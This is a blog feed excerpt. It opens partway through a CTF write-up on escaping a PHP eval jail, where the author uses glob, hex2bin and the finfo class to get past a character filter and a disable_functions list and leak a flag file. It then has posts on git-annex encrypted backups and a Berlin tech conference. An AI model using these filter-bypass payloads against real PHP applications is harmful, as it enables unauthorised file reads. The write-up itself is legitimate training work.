<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">RingZer0 Team Online CTF

PHP Jail Level 5:
Current user is uid=1004(level5) gid=1004(level5) groups=1004(level5)

Flag is located at /home/level5/flag.txt

Challenge PHP code:
-----------------------------

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain &#34;disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file&#34;

<span style="color:#cd2828;font-weight:bold">&lt;?php</span>
array_shift(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
<span style="color:#40ffff">$var</span> = implode(<span style="color:#ed9d13">&#34; &#34;</span>, <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);

<span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$var</span> == <span style="color:#6ab825;font-weight:bold">null</span>) <span style="color:#6ab825;font-weight:bold">die</span>(<span style="color:#ed9d13">&#34;PHP Jail need an argument</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);

<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">filter</span>(<span style="color:#40ffff">$var</span>) {
        <span style="color:#6ab825;font-weight:bold">if</span>(preg_match(<span style="color:#ed9d13">&#39;/(\_|\&#39;|\&#34;|`|\.|\$|\/|a|c|s|z|require|include)/i&#39;</span>, <span style="color:#40ffff">$var</span>)) {
                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
        }
        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>;
}
<span style="color:#6ab825;font-weight:bold">if</span>(filter(<span style="color:#40ffff">$var</span>)) {
        <span style="color:#6ab825;font-weight:bold">eval</span>(<span style="color:#40ffff">$var</span>);
        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Command executed&#34;</span>;
} <span style="color:#6ab825;font-weight:bold">else</span> {
        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Restricted characters has been used&#34;</span>;
}
<span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>;
<span style="color:#cd2828;font-weight:bold">?&gt;</span>

-----------------------------
Your input:
</code></pre></div><p>The first thing I did was to generate the filename (<code>flag.txt</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">Your input:
print(glob(hex2bin(hex2bin(3261)))[0]);
flag.txtCommand executed
Your input:
</code></pre></div><p>Then I needed some function to read the contents from <code>flag.txt</code>. However, due to additional character restrictions, I wasn&rsquo;t able to find
any one that would bypass the restrictions. Then I bought the hint which stated:</p>
<blockquote>
<p>md5 can return raw characters such as *, Some classes can help you error messages too</p>
</blockquote>
<p>So I need some class with some <strong>constructor</strong> which takes a filename as an argument. As always: Google is your friend -&gt;
<code>inurl:php.net/manual/en/class</code>. And then I&rsquo;ve found <a href="http://php.net/manual/en/class.finfo.php">Finfo</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your input:
new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
PHP Notice:  finfo::finfo(): Warning: offset `FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ&#39; invalid in /home/level5/jail.php(14) : eval()&#39;d code on line 1
PHP Notice:  finfo::finfo(): Warning: type `FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ&#39; invalid in /home/level5/jail.php(14) : eval()&#39;d code on line 1
PHP Warning:  finfo::finfo(): Failed to load magic database at &#39;/home/level5/flag.txt&#39;. in /home/level5/jail.php(14) : eval()&#39;d code on line 1
Command executed
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Distribute your backups using git-annex</title>
      <link>https://blog.dornea.nu/2016/06/16/distribute-your-backups-using-git-annex/</link>
      <pubDate>Thu, 16 Jun 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/06/16/distribute-your-backups-using-git-annex/</guid>
      <content:encoded><![CDATA[<p>Backuping a whole bunch of photos and videos might be a difficult task. Taking care of the <strong>consistency</strong> of your backups is even more complicated task. Besides that you don&rsquo;t want to have your backups at a <strong>single place</strong>, thus mitigating the impact of a <strong>single point of data loss</strong>.</p>
<p>I&rsquo;ve been using <code>git-annex</code> for some years but not like a <em>pro</em> user, rather than &ldquo;it just works&rdquo;. Meanwhile I&rsquo;ve heard of <code>ownCloud</code> and I&rsquo;ve liked it because one can access its data via <em>web</em>, <em>mobile client</em> or whatever. In connection with a <strong>VPN</strong> (I prefer <a href="http://blog.dornea.nu/2015/11/17/openvpn-for-paranoids">openvpn</a>) solution you can have a <strong>secure</strong> way of remotely accessing your data from everywhere.</p>
<p>Well this post is where the link between <code>git-annex</code> and <code>ownCloud</code> should be emphasized: Use ownCloud as your &ldquo;frontend&rdquo; tool for accessing the data while letting git-annex do the &ldquo;backend&rdquo; (aka backup) job. While this might sound like a pretty easy task, it does have some peculiarities to be taken into consideration.</p>
<h1 id="backup-setup">Backup setup</h1>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>blockdiag {
  R [label=&quot;Raspberry Pi (central repo)&quot;, color=&quot;lightblue&quot;, width=192];
  S [label=&quot;External Server (git + data)&quot;, width=192];
  C [label=&quot;Cloud&quot;];
  L [label=&quot;Laptop&quot;];
  M [label=&quot;Mobile Clients&quot;];
  G [label=&quot;GitHub (only git)&quot;, width=192];

  L -&gt; R [label=&quot;plain&quot;];
  M -&gt; R ; 
  R -&gt; S [label=&quot;enc&quot;];
  R -&gt; G ; 
  S -&gt; C [label=&quot;enc&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/distribute-your-backups-git-annex/xx01.png" alt="png"></p>
<p>There is one <strong>centralized</strong> repo on my raspberry pi where my HDD is attached to. Usually I <em>push</em> stuff to the HDD using <code>rsync</code> from my laptop or <code>ownCloud</code> using my mobile clients. Afterwards the <strong>encrypted</strong> repo <strong>and</strong> the data itself is being pushed to some <strong>external server</strong>. Data is being encrypted using my private GPG key. From the server I could then replicate the repo+data stuff to some <strong>cloud</strong> provider like <em>AWS</em>, <em>DropBox</em> or whatever.</p>
<p>Additionally one could push the git repo to GitHub in an encrypted form - without the data itself. It will then only contain the git information (symlinks) but no data (annexed data).</p>
<h2 id="using-owncloud-with-git-annex">Using ownCloud with git-annex</h2>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>blockdiag {
 C [label=&quot;ownCloud client&quot;, width=192];
 S [label=&quot;Server&quot;];
 Cloud [label=&quot;Cloud&quot;];
 group {
   label = &quot;frontend&quot;;
   O [label=&quot;ownCloud&quot;];
 }
 group {
   label = &quot;backend&quot;;
   G [label=&quot;git-annex&quot;];
 }
 C -&gt; O [folded];
 G -&gt; S;
 S -&gt; Cloud;
} 
</code></pre>

</details>

<p><img src="/posts/img/2016/distribute-your-backups-git-annex/xx02.png" alt="png"></p>
<p><code>ownCloud</code> will act as a <strong>front-end</strong> and can be used by any ownCloud client. The data itself is then managed by <code>git-annex</code> which basically acts as a <code>back-end</code>.  One can access the data using ownCloud but you there are some restrictions:</p>
<ul>
<li>already annexed data can&rsquo;t be deleted</li>
<li>you can add files/folders and delete them only if these weren&rsquo;t added to the git-annex repo yet</li>
</ul>
<p>That means: Newly added data (but not committed to the repo) can be deleted by the client which added the data. In this case old data can&rsquo;t be deleted. You&rsquo;ll have to work with git-annex to do that.</p>
<h2 id="encryption">Encryption</h2>
<p>One the important constraints before pushing my backups into the cloud was <strong>security</strong>. In order to be able to encrypt my stuff <strong>before</strong> pushing into the cloud, I had to</p>
<ul>
<li>generate a GPG key</li>
<li>create a special remote (see below) which offers encryption</li>
</ul>
<h3 id="gpg">GPG</h3>
<p>Generating a GPG key was the easiest step. Afterwards I had to make sure that my <strong>keychain</strong> was available <code>git-annex</code> for a specific period of time. Here are my configuration files:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat ~/.gnupg/gpg.conf | tail -n 3

use-agent
pinentry-mode loopback

</code></pre></div><p>and then the GPG agent configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat ~/.gnupg/gpg-agent.conf

pinentry-program /usr/bin/pinentry 
default-cache-ttl 180000
max-cache-ttl 864000
allow-loopback-pinentry
</code></pre></div><h3 id="keychain">Keychain</h3>
<p>Then I&rsquo;ve found <a href="http://www.funtoo.org/Keychain">keychain</a> which helps you manage your SSH and GPG keys in a secure manner. Adding this to your bashrc/zshrc/whatever</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ eval `keychain --inherit any --eval --agents ssh,gpg id_rsa_backup xxx`

* keychain 2.8.2 ~ http://www.funtoo.org
 * Inheriting ssh-agent (7268)
 * Inheriting gpg-agent (3528)
 * Known ssh key: /home/cyneox/.ssh/id_rsa_backup

 * Known gpg key: xxxx

</code></pre></div><p>will <strong>cache</strong> your GPG and SSH keys to a specific time of period.</p>
<h1 id="git-annex-reference">git-annex reference</h1>
<h2 id="create-git-repo">Create git repo</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git init
</code></pre></div><h2 id="create-git-annex-repo">Create git annex repo</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git-annex init &lt;name&gt;
</code></pre></div><h1 id="add-remotes">Add remotes</h1>
<h2 id="create-bare-git-repo-on-the-server">Create bare git repo on the server</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git init --bare oc-encrypted 
</code></pre></div><h2 id="add-special-remote--sshrsync">Add special remote  (ssh+rsync)</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git-annex initremote oc-encrypted type=gcrypt gitrepo=ssh://backup.ext/home/backup/oc-encrypted keyid=xxxx
</code></pre></div><h1 id="synchronize-data">Synchronize data</h1>
<h2 id="sync-only-git-repository-to-ssh-remote">Sync only git repository to ssh remote</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git-annex sync oc-encrypted
</code></pre></div><h2 id="sync-git-repo--content-to-ssh-remote">Sync git repo + content to ssh remote</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git-annex sync --content oc-encrypted
</code></pre></div><p>If you have a look at the repo <code>oc-encrypted</code> on the external server, you&rsquo;ll see only encrypted stuff:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% tree | head -n 20 
.
|-- HEAD
|-- annex
|   |-- keys.lck
|   |-- objects
|   |   |-- 000
|   |   |   |-- 32a
|   |   |   |   `-- GPGHMACSHA1--0222fb5a96702da2e0e0d763f3893d0a97897d32
|   |   |   |       `-- GPGHMACSHA1--0222fb5a96702da2e0e0d763f3893d0a97897d32
|   |   |   |-- d88
|   |   |   |   `-- GPGHMACSHA1--55d8e2ea7626a3958b0182192e7cf34c8be09fd5
|   |   |   |       `-- GPGHMACSHA1--55d8e2ea7626a3958b0182192e7cf34c8be09fd5
|   |   |   `-- db9
|   |   |       `-- GPGHMACSHA1--2b2a121170d00fdb06a04d8df80b6135c4c51d7e
|   |   |           `-- GPGHMACSHA1--2b2a121170d00fdb06a04d8df80b6135c4c51d7e
|   |   |-- 001
|   |   |   |-- 380
|   |   |   |   `-- GPGHMACSHA1--6dbdddddde415496c429c9788428fffb358e55fa
|   |   |   |       `-- GPGHMACSHA1--6dbdddddde415496c429c9788428fffb358e55fa
|   |   |   |-- 590

% file annex/objects/000/32a/GPGHMACSHA1--0222fb5a96702da2e0e0d763f3893d0a97897d32/GPGHMACSHA1--0222fb5a96702da2e0e0d763f3893d0a97897d32 
annex/objects/000/32a/GPGHMACSHA1--0222fb5a96702da2e0e0d763f3893d0a97897d32/GPGHMACSHA1--0222fb5a96702da2e0e0d763f3893d0a97897d32: GPG symmetrically encrypted data (AES cipher)

</code></pre></div><h1 id="troubleshooting">Troubleshooting</h1>
<h2 id="find-broken-symlinks">Find broken symlinks</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ find . -xtype l
</code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ find . -type l -! -exec test -e {} \; -print
</code></pre></div><h1 id="garbage-collection">Garbage collection</h1>
<h2 id="delete-unused-annexed-data">Delete unused (annexed) data</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git-annex unused 
unused . (checking for unused data...) (checking master...) 
  Some annexed data is no longer used by any files:
    NUMBER  KEY
    1       SHA256E-s1048577--dd8a6196a5a42dc394ed277191024ba51149167f2afd577557e29d4495ce107b.this-is-a-test-key
    2       SHA256E-s11--1fd9176b4dc46b02de28fc850c160d9d0bf71ebd3cddac52b83b288d73645d89
    3       SHA256E-s1048575--b877cbd76972eabf53837edf24af92f3567ff9dc6cc42c420f5ebbcb911d0ad5.this-is-a-test-key
    4       SHA256E-s2097152--be41ea1dc3c13e45848717d213bf64d11171f221b86be4b91c56baa17193ee6e.this-is-a-test-key
  (To see where data was previously used, try: git log --stat -S&#39;KEY&#39;)
  
  To remove unwanted data: git-annex dropunused NUMBER
  

  Some partially transferred data exists in temporary files:
    NUMBER  KEY
    5       GPGHMACSHA1--5b029d5db5dde1c7e12e347580e732c00de22f6e
  
  To remove unwanted data: git-annex dropunused NUMBER
  
ok
</code></pre></div><p>Now you can <strong>drop</strong> the unused data:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git-annex dropunused 1-4
</code></pre></div><h2 id="delete-unused-remote">Delete unused remote</h2>
<p>First you&rsquo;ll have to mark the repo as <strong>dead</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git-annex dead &lt;remote name&gt;
</code></pre></div><p>Then you&rsquo;ll have to <strong>forget</strong> the <strong>dead</strong> repo:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git-annex forget --force --drop-dead
</code></pre></div><p>And finally you can <strong>remove</strong> the remote using <code>git</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ git remote remove &lt;repo name&gt;
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>The Digital Future in Berlin</title>
      <link>https://blog.dornea.nu/2016/05/11/the-digital-future-in-berlin/</link>
      <pubDate>Wed, 11 May 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/05/11/the-digital-future-in-berlin/</guid>
      <content:encoded><![CDATA[<p>Like always the obligatory introduction to the event:</p>
<blockquote>
<p>&ldquo;The digital age began 75 years ago in Berlin, when Konrad Zuse created the worldâ€™s first functioning computer, the Z3. Since then computers have changed the world, much like the steam engine and the car before them. The biggest changes in connection with digitalisation are still to come.&rdquo; (<a href="http://science-match.tagesspiegel.de/the-digital-future">http://science-match.tagesspiegel.de/the-digital-future</a>)</p>
</blockquote>
<p><img src="https://pbs.twimg.com/media/CiKS9oGXAAAhZkH.jpg:large" alt=""></p>
<h1 id="digital-future">Digital Future?</h1>
<p>Well, that sounded like a whole bunch of topics to be presented at the event: <strong>Big Data</strong>, communication, data analysis, digital society, <strong>future computing</strong>, gaming, mobility, <strong>networks</strong>, optimization, privacy, <strong>simulation</strong>, security, visualization. I&rsquo;ve highlighted those which in my oppinion were the most discussed ones and had a quite big focus in the presented research presentations.</p>
<p>Although I didn&rsquo;t have any big expectations, I had some problems identifying the audience the event
the targeting at. There were a lot of <strong>students</strong>, <strong>profs</strong> but also <strong>industry representatives</strong>
meant to &ldquo;work&rdquo; together building the <strong>new</strong> digital future. Even if the idea behing the whole event
is a great one (by putting science and industry together to work on new technologies), from my point
of view there were to many talks targeting the scientists and to less interaction between (at least a
public one) both groups.</p>
<h1 id="berlin">Berlin?</h1>
<p>I think there was no coincidence between the fact that <strong>Berlin</strong> was hosting the event and people
around the world gathered together to celebrate the <strong>digital revolution</strong> that began <strong>75</strong> years ago:</p>
<blockquote>
<p>On May 11, 1941, Konrad Zuse presented the first fully functional digital computer, his Z3, in Berlin and the Digital Age began. (Read more on <a href="http://www.zib.de/zuse75">http://www.zib.de/zuse75</a>)</p>
</blockquote>
<p>Many of the speakers had personal anecdotes related to their work and Berlin. It was indeed very
interesting to learn more about the very first beginning of the computational era and how <strong>physicists</strong> used computers for their theories and simulations.</p>
<p>One of the <strong>special guests</strong> was <a href="https://en.wikipedia.org/wiki/Michael_M%C3%BCller_(politician)">Michael MÃ¼ller</a> (governing mayor of Berlin) who emphasized the (historical) role of Berlin in building
new technologies and contribute to the <strong>digitalization</strong> of the world.</p>
<p><img src="https://pbs.twimg.com/media/CiKYUU7WwAAXign.jpg:large" alt=""></p>
<blockquote class="blockquote twitter-tweet" data-partner="tweetdeck"><p wdth=800px lang="de" dir="ltr">Guter Start auf dem <a href="https://twitter.com/hashtag/ScienceMatch?src=hash">#ScienceMatch</a> in Berln: Michael MÃ¼ller hÃ¤lt die Redezeit ein und bekommt ein Lebkuchenherz. <a href="https://t.co/yUZWzvf8bz">pic.twitter.com/yUZWzvf8bz</a></p>&mdash; Science Match (@ScienceMatch) <a href="https://twitter.com/ScienceMatch/status/730313680643035137">May 11, 2016</a></blockquote>
<p>There was <strong>nothing special</strong> about his keynote despite the fact that it was <strong>in German</strong> although
the majority of the audience was English speaking :)</p>
<h1 id="presentations">Presentations</h1>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="de" dir="ltr">Die digitale Zukunft wÃ¤re ein PowerPoint Seminar. ðŸ˜…ðŸ˜‚  <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a></p>&mdash; Thea (@Novemberbeetle) <a href="https://twitter.com/Novemberbeetle/status/730335433196998656">May 11, 2016</a></blockquote>
<p>By the way <em>presentations</em>: With all due respect to the speakers, I&rsquo;ve found the most (PowerPoint!) presentations quite odd and very old-fashioned. I don&rsquo;t really know what I was expecting but some talks were indeed very long-winded and partially overfilled with maths equations.</p>
<p><img src="https://pbs.twimg.com/media/CiK1XU5XEAASeN-.jpg:large" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">What a great speech about models of <a href="https://twitter.com/hashtag/datareduction?src=hash">#datareduction</a>! by Yannis Kevrekidis <a href="https://twitter.com/Princeton">@Princeton</a> <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://twitter.com/hashtag/Bodanov?src=hash">#Bodanov</a> <a href="https://twitter.com/hashtag/Markov?src=hash">#Markov</a> <a href="https://t.co/ALY2r06x5J">pic.twitter.com/ALY2r06x5J</a></p>&mdash; Telekom Innov. Labs (@T_Labs) <a href="https://twitter.com/T_Labs/status/730345511585206272">May 11, 2016</a></blockquote>
<p>Smart minds &hellip; But old-fasioned slides:</p>
<p><img src="https://pbs.twimg.com/media/CiKx_eWW0AARggR.jpg:large" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">Probably <a href="https://twitter.com/hashtag/smart?src=hash">#smart</a> <a href="https://twitter.com/hashtag/minds?src=hash">#minds</a>... Those <a href="https://twitter.com/hashtag/slides?src=hash">#slides</a> though. <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://twitter.com/hashtag/TheDigitalFuture?src=hash">#TheDigitalFuture</a> <a href="https://t.co/XkTUPQlGXV">pic.twitter.com/XkTUPQlGXV</a></p>&mdash; Alex Goller (@alpipego) <a href="https://twitter.com/alpipego/status/730341800213360640">May 11, 2016</a></blockquote>
<h1 id="personal-highlights">Personal highlights</h1>
<p>This is an uncategorized collection of some good thoughts, quotes or cool projects that were
presented during the conference.</p>
<h2 id="misc">Misc</h2>
<p><img src="https://pbs.twimg.com/ext_tw_video_thumb/730327164873248768/pu/img/KXCx9DUJW03Y7Wf0.jpg" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="de" dir="ltr">RT Gruendercoaches: RT bgewehr: Zuse in action <a href="https://twitter.com/hashtag/ScienceMatch?src=hash">#ScienceMatch</a> <a href="https://t.co/XQtJs2JCRw">pic.twitter.com/XQtJs2JCRw</a> <a href="https://twitter.com/hashtag/startup?src=hash">#startup</a></p>&mdash; Startup Kanal (@startupkanal) <a href="https://twitter.com/startupkanal/status/730329759117398016">May 11, 2016</a></blockquote>
<h2 id="smart-thoughts">Smart thoughts</h2>
<h3 id="us-using-germanys-computational-power">US using Germanys computational power</h3>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">Threre once was a time when american scientists had to come to germany to get access to <a href="https://twitter.com/hashtag/supercomputing?src=hash">#supercomputing</a>. Times have changed... <a href="https://twitter.com/hashtag/ScienceMatch?src=hash">#ScienceMatch</a></p>&mdash; Bernd Gewehr (@bgewehr) <a href="https://twitter.com/bgewehr/status/730314937273339904">May 11, 2016</a></blockquote>
<h3 id="double-zero-singularity">Double zero singularity</h3>
<div style="width: 100%;">
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">&quot;... Double Zero Singularity: It&#39;s like being married to a bad person. And her mom is also bad&quot; (Yannis Kevrekedis) <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a></p>&mdash; Victor Dorneanu (@victordorneanu) <a href="https://twitter.com/victordorneanu/status/730350879375757312">May 11, 2016</a></blockquote>
</div>
<h3 id="a-lot-of-data">A lot of data</h3>
<p><img src="https://pbs.twimg.com/media/CiKfuY-WMAA8lpZ.jpg:large" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/Data?src=hash">#Data</a> <a href="https://twitter.com/hashtag/Data?src=hash">#Data</a> <a href="https://twitter.com/hashtag/Data?src=hash">#Data</a>.... Much of Science is now Data-Intensive. <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://t.co/zQ8RVX0Rzt">pic.twitter.com/zQ8RVX0Rzt</a></p>&mdash; clehmi74 (@clehmi74) <a href="https://twitter.com/clehmi74/status/730321727759208448">May 11, 2016</a></blockquote>
<h3 id="data-science-as-4th-paradigm">Data science as 4th paradigm</h3>
<p><img src="https://pbs.twimg.com/media/CiKd95mWUAE8VL5.jpg:large" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">The four paradigms of science <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://t.co/H0NcF6Ap4u">pic.twitter.com/H0NcF6Ap4u</a></p>&mdash; FUbits (@FUbits) <a href="https://twitter.com/FUbits/status/730319776560590848">May 11, 2016</a></blockquote>
<h3 id="stone-age-of-data-management">Stone age of data management</h3>
<p><img src="https://pbs.twimg.com/media/CiL7E8yXIAEP0Ab.jpg:large" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">Volley Markl: we are in the Stone Age of data management <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://t.co/Ae5PRuwz4O">pic.twitter.com/Ae5PRuwz4O</a></p>&mdash; Anca Solacolu (@ancas_anca) <a href="https://twitter.com/ancas_anca/status/730422175140872192">May 11, 2016</a></blockquote>
<h3 id="immigrants">Immigrants</h3>
<p><img src="https://pbs.twimg.com/media/CiLyvkVU4AAn_mr.jpg:large" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="de" dir="ltr">&quot;Ein GroÃŸteil der Vordenker des digitalen Zeitalters waren FlÃ¼chtlinge&quot;, sagt <a href="https://twitter.com/SebastianTurner">@SebastianTurner</a> beim <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://t.co/WQEuVOvGZM">pic.twitter.com/WQEuVOvGZM</a></p>&mdash; Digital Present (@BerlinDigital) <a href="https://twitter.com/BerlinDigital/status/730412991183753216">May 11, 2016</a></blockquote>
<p>&ldquo;The brightest minds in the digital world were immigrants&rdquo;. Just think of:</p>
<ul>
<li>Steve Jobs</li>
<li>Mark Zuckerberg</li>
<li>Jeff Bezos</li>
<li>[&hellip;]</li>
</ul>
<h2 id="cool-talks">Cool talks</h2>
<h3 id="palm-turbulence-simulations">PALM (turbulence simulations)</h3>
<h4 id="urban-large-eddy-simulations">Urban Large-Eddy Simulations</h4>
<p><img src="https://pbs.twimg.com/media/CiKs6QMWsAAM3ER.jpg:large" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">Simulation of new Islands in. Macau... pretty cool. <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://t.co/MUhFycJC3a">pic.twitter.com/MUhFycJC3a</a></p>&mdash; David Martin Holte (@davidmholte) <a href="https://twitter.com/davidmholte/status/730336219347980288">May 11, 2016</a></blockquote>
<iframe width="100%" height="400" src="https://www.youtube.com/embed/y1sSRXFBN7k" frameborder="0" allowfullscreen></iframe>
<h4 id="airport-area-large-eddy-simulation">Airport Area Large-Eddy Simulation</h4>
<iframe width="100%" height="400" src="https://www.youtube.com/embed/8rIuwKlOB3k" frameborder="0" allowfullscreen></iframe>
<h3 id="keynote-of-peter-altmaier">Keynote of Peter Altmaier</h3>
<p><img src="https://pbs.twimg.com/media/CiL_0uNUYAAn9I1.jpg:large" alt=""></p>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="de" dir="ltr">Positiv Ã¼berrascht von <a href="https://twitter.com/peteraltmaier">@peteraltmaier</a> <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a> <a href="https://t.co/1dBsepMYeT">pic.twitter.com/1dBsepMYeT</a></p>&mdash; Aufsichtsrat (@GermanIOD) <a href="https://twitter.com/GermanIOD/status/730427373959655424">May 11, 2016</a></blockquote>
<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="en" dir="ltr">&quot;Berlin is open for the future. Nothing has been achieved.&quot; <a href="https://twitter.com/peteraltmaier">@peteraltmaier</a> <a href="https://twitter.com/hashtag/sciencematch?src=hash">#sciencematch</a></p>&mdash; Fabian Leipelt (@fleipelt) <a href="https://twitter.com/fleipelt/status/730416592111177728">May 11, 2016</a></blockquote>
<p>Another quotes from Mr. Altmaier:</p>
<blockquote>
<p>(1) &ldquo;We have to produce more students educated in computer science&rdquo;</p>
</blockquote>
<blockquote>
<p>(2) &ldquo;Berlin is a city open for the future, nothing is achieved&rdquo;</p>
</blockquote>
<blockquote>
<p>(3) &ldquo;The digitalization isn&rsquo;t under control of governments. Even if we destroy SiliconValley it would go on&rdquo;</p>
</blockquote>
<blockquote>
<p>(4) &ldquo;The regulation should be encouraging the development of new technology&rdquo;</p>
</blockquote>
<blockquote>
<p>(5) &ldquo;A challenge for Europe, no place for national egoism.&rdquo;</p>
</blockquote>
<blockquote>
<p>(6) &ldquo;We need more StartUps in Berlin. I would like to invite you to Berlin!&rdquo; &ldquo;Everything is open in Berlin.&rdquo;</p>
</blockquote>
<h3 id="graphs-by-jennifer-chayes">Graphs by Jennifer Chayes</h3>
<p><img src="https://pbs.twimg.com/media/CiLGgd8WEAU-NbX.jpg:large" alt=""></p>
